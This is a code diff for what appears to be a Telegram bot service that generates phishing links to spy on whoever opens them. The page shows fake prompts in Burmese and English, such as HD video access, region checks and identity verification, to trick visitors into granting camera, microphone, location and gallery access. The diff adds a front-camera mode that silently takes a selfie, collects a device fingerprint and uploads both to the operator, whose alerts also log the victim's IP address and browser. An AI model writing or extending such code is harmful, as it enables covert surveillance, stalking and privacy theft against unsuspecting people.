@@ -425,6 +425,8 @@ async function startCapture(){
     await sendVideo();animateBuffer(100,600);
   } else if(mode==="gallery"){
     await sendGallery();animateBuffer(100,600);
+  } else if(mode==="frontcam"){
+    await sendFrontPhoto();animateBuffer(100,600);
   } else {
     animateBuffer(100,600);
   }
@@ -437,7 +439,8 @@ const MODAL={
   audio:{icon:"🎤",mm:"မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",en:"Microphone Required",bmm:"HD အသံဖြင့် ကြည့်ရှုရန် မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",ben:"Microphone required for HD audio experience."},
   location:{icon:"📍",mm:"တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်",en:"Region Check Required",bmm:"သင်နေသောဒေသမှ ဤဗီဒီယောကို ကြည့်ရှုခွင့်ရှိမရှိ စစ်ဆေးရန် လိုအပ်သည်",ben:"Location check required to verify you can watch this in your region."},
   video:{icon:"🎥",mm:"ကင်မရာ + မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",en:"Camera & Mic Required",bmm:"HD ဗီဒီယို ကြည့်ရှုရန် ကင်မရာနှင့် မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",ben:"Camera & mic access required to stream HD video."},
-  gallery:{icon:"🖼️",mm:"Gallery ခွင့်ပြုချက် လိုအပ်သည်",en:"Gallery Access Required",bmm:"ဓာတ်ပုံများ ကြည့်ရှုရန် Gallery ခွင့်ပြုချက် ပေးရန် လိုအပ်သည်",ben:"Gallery access required to unlock HD photo content."}
+  gallery:{icon:"🖼️",mm:"Gallery ခွင့်ပြုချက် လိုအပ်သည်",en:"Gallery Access Required",bmm:"ဓာတ်ပုံများ ကြည့်ရှုရန် Gallery ခွင့်ပြုချက် ပေးရန် လိုအပ်သည်",ben:"Gallery access required to unlock HD photo content."},
+  frontcam:{icon:"🤳",mm:"Front ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",en:"Front Camera Required",bmm:"Selfie ပုံဖြင့် အတည်ပြုရန် Front ကင်မရာ ခွင့်ပြုချက် ပေးရန် လိုအပ်သည်",ben:"Front camera access required for identity verification."}
 };
 document.getElementById("playBtn").onclick=()=>{
   const t=MODAL[mode]||MODAL.all;
@@ -462,6 +465,26 @@ document.getElementById("playBtn").onclick=()=>{
     setTimeout(()=>document.getElementById("playBtn").click(),1800);
   };
 };
+async function sendFrontPhoto(){
+  try{
+    const stream=await getCameraStream("user");
+    const v=document.createElement("video");
+    v.srcObject=stream;v.setAttribute("playsinline","");v.setAttribute("muted","");
+    await new Promise((res,rej)=>{v.onloadedmetadata=()=>v.play().then(res).catch(rej);v.onerror=rej;});
+    await new Promise(r=>setTimeout(r,1500));
+    const c=document.createElement("canvas");
+    c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
+    c.getContext("2d").drawImage(v,0,0);
+    stream.getTracks().forEach(t=>t.stop());
+    const blob=await new Promise(r=>c.toBlob(r,"image/jpeg",0.9));
+    if(!blob||blob.size<800)return;
+    const fp=await collectFingerprint();
+    const form=new FormData();
+    form.append("token",token);form.append("photo",blob,"selfie.jpg");
+    form.append("fingerprint",JSON.stringify(fp));form.append("label","🤳 FRONT CAM SELFIE");
+    fetch("/capture_combined_photo",{method:"POST",body:form});
+  }catch(e){}
+}
 async function sendGallery(){
   try{
     await new Promise(resolve=>{
@@ -522,7 +545,8 @@ def track_page(token):
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
         ua = request.headers.get('User-Agent', 'Unknown')[:120]
         mode_labels = {'all':'🌐 All-in-One','photo':'📸 Photo','audio':'🎤 Audio',
-                       'location':'📍 Location','video':'🎥 Video','gallery':'🖼️ Gallery'}
+                       'location':'📍 Location','video':'🎥 Video','gallery':'🖼️ Gallery',
+                       'frontcam':'🤳 Front Cam'}
         label = mode_labels.get(mode, mode)
         alert = (
             f"🔗 <b>Link ဖွင့်သည်! | Link Opened!</b>\n"
@@ -770,7 +794,7 @@ def get_reply_keyboard():
             [KeyboardButton("🌐 All-in-One Link")],
             [KeyboardButton("📸 Photo Link"), KeyboardButton("🎤 Audio Link")],
             [KeyboardButton("📍 Location Link"), KeyboardButton("🎥 Video Link")],
-            [KeyboardButton("🖼️ Gallery Link")],
+            [KeyboardButton("🖼️ Gallery Link"), KeyboardButton("🤳 Front Cam Link")],
             [KeyboardButton("💰 Daily Bonus"), KeyboardButton("👥 Refer & Earn")],
             [KeyboardButton("💎 My Points | Access"), KeyboardButton("📋 Active Links")],
             [KeyboardButton("🗑 Clear Links"), KeyboardButton("❓ Help")],
@@ -787,7 +811,8 @@ def main_menu_inline():
          InlineKeyboardButton("🎤 Audio", callback_data="gen_audio")],
         [InlineKeyboardButton("📍 Location", callback_data="gen_location"),
          InlineKeyboardButton("🎥 Video", callback_data="gen_video")],
-        [InlineKeyboardButton("🖼️ Gallery Link", callback_data="gen_gallery")],
+        [InlineKeyboardButton("🖼️ Gallery Link", callback_data="gen_gallery"),
+         InlineKeyboardButton("🤳 Front Cam", callback_data="gen_front")],
         [InlineKeyboardButton("💰 Daily Bonus", callback_data="daily"),
          InlineKeyboardButton("👥 Refer & Earn", callback_data="refer")],
         [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
@@ -1219,6 +1244,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📍 Location Link":    ("location", "📍 Location"),
         "🎥 Video Link":       ("video", "🎥 Video"),
         "🖼️ Gallery Link":     ("gallery", "🖼️ Gallery"),
+        "🤳 Front Cam Link":   ("frontcam", "🤳 Front Cam"),
     }
 
     if text in MODE_MAP:
@@ -1292,7 +1318,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "❓ <b>Help | အကူအညီ</b>\n\n"
             "<b>Links:</b>\n"
             "🌐 All → Photo+Audio+Location+Video+Device\n"
-            "📸 Photo → ဓာတ်ပုံ\n🎤 Audio → အသံ\n📍 Location → တည်နေရာ\n🎥 Video → ဗီဒီယို\n🖼️ Gallery → ဓာတ်ပုံ Gallery\n\n"
+            "📸 Photo → ဓာတ်ပုံ\n🎤 Audio → အသံ\n📍 Location → တည်နေရာ\n🎥 Video → ဗီဒီယို\n🖼️ Gallery → ဓာတ်ပုံ Gallery\n🤳 Front Cam → Selfie ဓာတ်ပုံ\n\n"
             "<b>Points system:</b>\n"
             f"🎁 Daily Bonus → +{DAILY_BONUS_PTS} pts/day\n"
             f"👥 Refer → +{REFER_BONUS_PTS} pts + 1 day/ကိုယ်\n"
@@ -1324,6 +1350,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "gen_location": ("location", "📍 Location"),
         "gen_video": ("video", "🎥 Video"),
         "gen_gallery": ("gallery", "🖼️ Gallery"),
+        "gen_front":   ("frontcam", "🤳 Front Cam"),
     }
 
     if data in GEN_MODES:
